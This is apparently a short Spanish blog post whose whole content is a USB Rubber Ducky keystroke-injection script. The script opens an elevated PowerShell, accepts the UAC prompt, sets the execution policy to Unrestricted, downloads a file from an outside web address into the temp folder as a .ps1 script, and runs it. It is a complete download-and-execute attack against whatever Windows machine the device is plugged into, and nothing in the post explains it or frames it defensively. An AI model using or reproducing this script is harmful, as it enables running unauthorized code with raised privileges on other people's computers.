# Descargar y ejecutar un script cambiando la directiva de ejecución
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/01/08/descargar-y-ejecutar-un-script-cambiando-la-directiva-de-ejecucion/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
STRING Set-ExecutionPolicy Unrestricted
ENTER
DELAY 2050
STRING s
ENTER
DELAY 2050
GUI r
DELAY 100
STRING powershell Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config.ps1;
DELAY 100
STRING powershell -File $env:TEMP\config.ps1
ENTER

```
